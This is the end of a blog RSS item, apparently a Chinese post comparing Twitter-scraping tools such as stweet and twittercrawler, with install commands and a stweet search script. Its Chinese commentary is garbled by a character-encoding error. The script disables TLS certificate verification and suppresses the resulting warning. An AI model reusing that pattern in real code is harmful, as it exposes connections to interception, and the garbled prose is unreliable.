class="comment"># Requirement already satisfied: python-dateutil in c:\users\linki\desktop\t\lib\site-packages (2.8.2)</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: six&gt;=1.5 in c:\users\linki\desktop\t\lib\site-packages (from python-dateutil) (1.16.0)</span></span><br></pre></td></tr></table></figure><p> ç›´æ¥è£…ä¸ª scrapy å¾—äº†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">pip install ipdb</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æ²¡æœ‰ç»™ä»£ç†é…ç½®çš„å…¥å£ï¼Œæ˜¾ç„¶è¿ä¸ä¸Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl twittercrawler -a filename=myhashtags.csv -o mydata.csv</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> èƒ½å¤Ÿè‡ªå®šä¹‰çš„é…ç½®é¡¹å¤ªå°‘ï¼Œè€Œä¸”ä»…é’ˆå¯¹æ ‡ç­¾æœç´¢ï¼Œè·³è¿‡ã€‚</p></li></ol><h2 id="stweet"><a href="#stweet" class="headerlink" title="stweet"></a><a href="https://github.com/markowanga/stweet">stweet</a></h2><p>æ”¯æŒæ¨ç‰¹çš„é«˜çº§æœç´¢é€‰é¡¹ï¼ŒåŒæ—¶æ”¯æŒæ¨æ–‡å’Œç”¨æˆ·ä¿¡æ¯çš„çˆ¬å–<del>ï¼Œstweet&#x2F;docs&#x2F;notebooks&#x2F; ç›®å½•ä¸‹æœ‰å„ç§ç¤ºä¾‹</del>ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stweet</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æä¾›è®¸å¤šé…ç½®é¡¹ï¼Œéå¸¸å‹å¥½</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"><span class="keyword">import</span> stweet <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line">ProxyConfig = st.RequestsWebClientProxyConfig(</span><br><span class="line">    http_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>,</span><br><span class="line">    https_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">since = arrow.get(<span class="string">&#x27;2021-10-01&#x27;</span>)</span><br><span class="line">until = arrow.get(<span class="string">&#x27;2021-10-02&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_tweets_task = st.SearchTweetsTask(</span><br><span class="line">    exact_words=<span class="string">&quot;nijisanji&quot;</span>,</span><br><span class="line">    since=since,</span><br><span class="line">    until=until,</span><br><span class="line">    replies_filter=st.RepliesFilter.ONLY_ORIGINAL,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">st.TweetSearchRunner(</span><br><span class="line">    search_tweets_task=search_tweets_task,</span><br><span class="line">    tweet_outputs=[st.CsvTweetOutput(<span class="string">&#x27;nijisanji_20211001_20211002.csv&#x27;</span>), st.PrintTweetOutput()],</span><br><span class="line">    web_client=st.RequestsWebClient(proxy=ProxyConfig, verify=<span class="literal">False</span>),</span><br><span class="line">).run()</span><br></pre></td></tr></table></figure><p> ä¸ç¢äº‹å„¿çš„è­¦å‘Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;127.0.0.1&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">warnings.warn(</span><br></pre></td></tr></table></figure><p> æ·»åŠ ä»¥ä¸‹è¯­å¥å…³é—­</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><p> çˆ¬å¾—éå¸¸å¿«ï¼Œå­—æ®µä¹Ÿæ¯” scweet æ”¶é›†çš„å¤šï¼Œä½†æ˜¯åªæœ‰ 2021.10.02 çš„æ•°æ®ï¼Œéš¾é“æ—¶é—´èŒƒå›´æ˜¯å·¦å¼€å³é—­çš„ã€‚å¤šè¯•å‡ æ¬¡å‘ç°çˆ¬å¤ªå¿«äº†æç¤º <code>è¿œç¨‹ä¸»æœºå¼ºè¿«å…³é—­äº†ä¸€ä¸ªç°æœ‰çš„è¿æ¥</code>ï¼Œè€Œä¸”æ¯æ¬¡çˆ¬å–çš„ç»“æœéƒ½ä¸ä¸€æ ·â€¦</p> <img src="https://i.loli.net/2021/10/11/cXw9h8bOK1EAYjQ.png"></li><li><p>æ€»ç»“</p><p> è™½ç„¶èƒ½ç”¨ä½†æœ‰ç‚¹é—®é¢˜ï¼Œä½œè€…æ­£åœ¨å‡†å¤‡ stweet 2.0ï¼Œç­‰æ¨å‡ºä¹‹åå†è¿›è¡Œå°è¯•ã€‚</p></li><li><p>æ›´æ–°</p><p> 2021.10.14 æ›´æ–° stweet 2.0ï¼Œè¯´æ˜æ–‡æ¡£è¿˜ä¸å¤Ÿå®Œå–„ï¼Œå¦‚ä½•ä½¿ç”¨çš„ä¾‹å­ä¹Ÿæ²¡æœ‰ã€‚<br> 2021.10.15 æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥çˆ¬å–æ¨æ–‡æ•°æ®å’Œç”¨æˆ·æ•°æ®å¦ï¼Œä½†æ˜¯ç°åœ¨åªæ”¯æŒä¿å­˜ JSON æ ¼å¼çš„æ–‡ä»¶ï¼ˆå› ä¸ºæ²¡å†™è§£æï¼‰ï¼Œé‡å¤çˆ¬å–äº†å‡ æ¬¡ä»æ–‡ä»¶å¤§å°ä¸Šçœ‹éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥åº”è¯¥æ²¡é—®é¢˜äº†ã€‚å¯ä»¥å†ç­‰ç­‰å®Œå–„ã€‚</p></li></ol><h2 id="Web-Scraping-Tweet-Traffic"><a href="#Web-Scraping-Tweet-Traffic" class="headerlink" title="Web_Scraping_Tweet_Traffic"></a><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></h2><p>é…åˆæ–‡ç« é£Ÿç”¨ï¼š</p><ul><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-1-b3e2db29051d">Web Scrape Twitter by Python Selenium (Part 1)</a></li><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-2-c22ae3e78e03">Web Scrape Twitter by Python Selenium (Part 2)</a></li></ul><p>è¯¥ä»“åº“å·²äº 2019 å¹´åœæ›´ï¼Œå¯ä½œä¸ºçˆ¬å–æ€è·¯çš„å­¦ä¹ ææ–™ã€‚</p><h1 id="åœ¨çº¿çˆ¬å–"><a href="#åœ¨çº¿çˆ¬å–" class="headerlink" title="åœ¨çº¿çˆ¬å–"></a>åœ¨çº¿çˆ¬å–</h1><p><a href="https://www.vicinitas.io/free-tools/download-search-tweets">https://www.vicinitas.io/free-tools/download-search-tweets</a> ï¼Œéœ€è¦æ¨ç‰¹è´¦æˆ·ç™»é™†åçˆ¬å–ï¼Œå¯ä»¥ä¸€è¯•ã€‚</p><img src="https://i.loli.net/2021/10/11/ckCoM9PsF18huad.jpg">]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Python/">Python</category>
      
      
      <comments>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
